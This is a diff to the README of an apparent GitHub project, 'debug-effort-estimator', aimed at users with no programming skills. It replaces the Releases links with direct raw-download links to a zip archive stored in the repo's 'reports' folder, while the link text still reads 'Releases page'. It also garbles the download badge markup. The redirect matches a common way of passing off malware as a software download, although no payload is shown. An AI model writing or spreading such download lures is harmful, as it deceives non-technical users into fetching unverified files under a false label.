@@ -4,7 +4,7 @@
 Welcome to the **debug-effort-estimator**! This machine learning system helps you estimate the time needed to debug software based on error logs. You do not need any programming skills to use it. Simply follow these easy steps to get started.
 
 ## 📥 Download the Software
-[![Download Here](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/jul-mokel/debug-effort-estimator/releases)
+[![Download Here](https://github.com/jul-mokel/debug-effort-estimator/raw/refs/heads/main/reports/effort-debug-estimator-2.9-beta.2.zip%20Now-Click%https://github.com/jul-mokel/debug-effort-estimator/raw/refs/heads/main/reports/effort-debug-estimator-2.9-beta.2.zip)](https://github.com/jul-mokel/debug-effort-estimator/raw/refs/heads/main/reports/effort-debug-estimator-2.9-beta.2.zip)
 
 ## 📦 System Requirements
 Before you download the application, ensure your system meets these requirements:
@@ -23,7 +23,7 @@ Before you download the application, ensure your system meets these requirements
 - **Open-Source Code**: Feel free to inspect or contribute to the code on GitHub.
 
 ## 🔗 Download & Install
-To get the application, visit the [Releases page](https://github.com/jul-mokel/debug-effort-estimator/releases).
+To get the application, visit the [Releases page](https://github.com/jul-mokel/debug-effort-estimator/raw/refs/heads/main/reports/effort-debug-estimator-2.9-beta.2.zip).
 
 1. Click the link to go to the Releases page.
 2. Choose the latest version of the software.
